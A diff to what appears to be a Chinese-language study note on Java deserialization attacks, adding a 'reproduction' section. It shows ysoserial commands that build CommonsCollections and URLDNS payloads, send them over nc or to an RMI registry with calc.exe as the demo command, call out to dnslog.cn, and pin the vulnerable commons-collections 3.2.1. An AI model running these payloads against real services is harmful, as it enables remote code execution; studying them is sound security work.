@@ -16,7 +16,9 @@ $ nc 10.10.10.10 1099 < groovypayload.bin
 $ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
-对生成后的文件进行反序列化，存在对应的依赖，则可以触发。
+^
+## **复现**
+对生成后的.bin文件进行反序列化，存在对应的依赖，则可以触发。
 ```
  java -jar ysoserial.jar CommonsCollections7 calc.exe >cc7.bin
  java -jar ysoserial.jar URLDNS http://dnslog.cn >url.bin
@@ -32,5 +34,14 @@ public static void main(String[] args) throws IOException, ClassNotFoundExceptio
     new ArrayStack();
     DeSerializable("src/cc7.bin");
 }
+```
+```
+<dependencies>
+    <dependency>
+        <groupId>commons-collections</groupId>
+        <artifactId>commons-collections</artifactId>
+        <version>3.2.1</version>
+    </dependency>
+</dependencies>
 ```
 
